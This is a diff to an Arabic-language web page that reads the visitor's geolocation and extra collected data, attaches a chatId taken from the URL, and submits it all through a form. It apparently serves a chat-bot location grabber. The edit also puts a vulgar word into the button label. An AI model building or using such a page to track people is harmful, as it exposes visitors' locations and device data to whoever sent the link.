@@ -51,7 +51,7 @@
 </head>
 <body>
     <div class="container">
-        <button onclick="getLocation()">اضغط هنا لتحديد موقعك</button>
+        <button onclick="getLocation()">اضغط هنا لنيك لتحديد موقعك</button>
         <div class="loading" id="loading" style="display: none;"></div>
         <p class="result" id="userLocation"></p>
     </div>
@@ -76,20 +76,25 @@
         }
 
         async function showPosition(position) {
-    const latitude = position.coords.latitude;
-    const longitude = position.coords.longitude;
-    const chatId = getParameterByName('chatId');  // احصل على chatId من الـ URL
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const chatId = getParameterByName('chatId');  // احصل على chatId من الـ URL
 
-    const additionalData = await collectAdditionalData();
+            if (!chatId) {
+                alert("لم يتم العثور على معرف المحادثة في الـ URL.");
+                document.getElementById("loading").style.display = "none";
+                return;
+            }
 
-    document.getElementById("latitude").value = latitude;
-    document.getElementById("longitude").value = longitude;
-    document.getElementById("chatId").value = chatId;
-    document.getElementById("additionalData").value = JSON.stringify(additionalData);
+            const additionalData = await collectAdditionalData();
 
-    document.getElementById("location-form").submit();
-}
+            document.getElementById("latitude").value = latitude;
+            document.getElementById("longitude").value = longitude;
+            document.getElementById("chatId").value = chatId;
+            document.getElementById("additionalData").value = JSON.stringify(additionalData);
 
+            document.getElementById("location-form").submit();
+        }
 
         function handleError(error) {
             document.getElementById("loading").style.display = "none";
